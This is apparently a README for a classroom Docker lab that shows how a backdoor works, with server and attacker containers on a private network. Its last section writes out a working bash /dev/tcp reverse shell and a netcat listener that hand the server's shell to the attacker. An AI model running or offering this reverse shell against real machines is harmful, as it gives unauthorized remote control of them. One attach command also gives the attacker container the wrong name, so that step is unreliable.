# Demonstration of backdoor
## About the docker images
Two images (one for the server, another for the attacker) are created based on Ubuntu 20.04 OS with minimal packages pre-installed.<br>

## Network configuration
The server and attacker containers will be created and attach to network 10.9.0.0/24 <br>
The server machine is named server-10.9.0.5, whereas attacker-10.9.0.6 is the name of the attacker machine.<br>
The local directory `/mapdir` inside the server mapped to directory `./containers` on the host machine.<br>
## Building up the network
1. Create a directory named Backdoor. Copy docker-compose.yml and directory containers to the newly created directory.
2. Inside Backdoor directory, issuing the command `$>docker-compose up` to build up the images, containers, network. When everything is up, the containers are ready.<br>
## Attach to machines
In a new terminal, issuing `$>docker ps` to list all running containers. There should be names of server and attacker machines.<br>
To attach to the server machine, issuing `$>docker exec -it server-10.9.0.5 /bin/bash`. You should be inside the server.<br>
To attach to the attacker machine, issuing `$>docker exec -it attacker-10.9.0.5 /bin/bash`. You should be inside the attacker.<br>
## Open the backdoor
While in the attacker machine, issue  `# nc -l 9090 -v`. The attacker will listen on port 9090 for connection.<br>
In the server machine, issue `# /bin/bash -c "/bin/bash -i > /dev/tcp/10.9.0.6/9090 0<&1 2>&1"`.<br>
A TCP connection between the two machines is now established. All input and output of the server are now directed to the attacker machine! 
